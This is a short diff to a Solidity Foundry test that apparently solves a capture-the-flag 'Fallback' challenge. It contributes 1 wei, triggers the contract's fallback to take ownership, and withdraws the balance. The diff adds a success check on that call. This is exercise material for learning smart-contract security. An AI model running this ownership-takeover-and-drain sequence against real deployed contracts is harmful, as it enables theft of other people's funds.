@@ -30,13 +30,13 @@ contract FallbackTest is Test {
 
     function testAttack() public {
         /* Setup stuff, no need to touch */
-        uint256 balBefore = address(fallbhack).balance;
         vm.startPrank(attacker);
         vm.deal(attacker, 5 ether);
 
         /* Write your code here */  
         fallbhack.contribute.value(1 wei)(); // Just add a contribution
-        payable(address(fallbhack)).call.value(1 wei)(""); // Claim ownership
+        (bool worked,) = payable(address(fallbhack)).call.value(1 wei)(""); // Claim ownership
+        assert(worked);
         fallbhack.withdraw(); // Withdraw funds
         /* Write your code here */ 
 
